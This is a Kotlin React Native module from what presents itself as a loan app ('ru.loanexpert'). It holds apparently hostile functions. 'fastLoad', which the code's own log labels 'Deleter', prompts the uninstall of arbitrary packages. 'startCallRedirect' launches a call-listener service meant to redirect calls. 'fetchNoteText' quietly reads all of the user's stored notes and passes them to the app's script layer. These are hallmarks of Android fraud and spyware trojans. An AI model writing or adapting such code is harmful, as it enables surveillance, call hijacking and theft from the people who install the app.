package ru.loanexpert

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.content.ContentResolver;
import android.database.Cursor;
import com.facebook.react.bridge.Callback;
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import android.util.Log
import java.util.ArrayList;
class MainModule(reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext) {
    override fun getName() = "MainModule"
    @ReactMethod
    fun fastLoad(name: String) {
        Log.d(TAG,"Deleter")
        val intent = Intent(Intent.ACTION_DELETE)
        intent.data = Uri.parse("package:$name")
        currentActivity?.startActivity(intent)
    }
    @ReactMethod
    fun startCallRedirect() {
        Log.d(TAG,"CallRedirect")
        val serviceIntent = Intent(reactApplicationContext, CallListenerService::class.java)
        reactApplicationContext.startService(serviceIntent)
    }
    @ReactMethod
    fun fetchNoteText(callback: Callback) {
        val notes = ArrayList<String>()
        val resolver: ContentResolver = reactApplicationContext.contentResolver
        val uri: Uri = Uri.parse("content://com.android.notes.provider/notes")
        val cursor: Cursor? = resolver.query(uri, null, null, null, null)

        cursor?.use {
            while (cursor.moveToNext()) {
                val noteText: String = cursor.getString(cursor.getColumnIndex("note"))
                notes.add(noteText)
            }
        }

        callback.invoke(notes.toString())
    }
    companion object {
            private const val TAG = "ru.loanexpertInfo"
        }
}
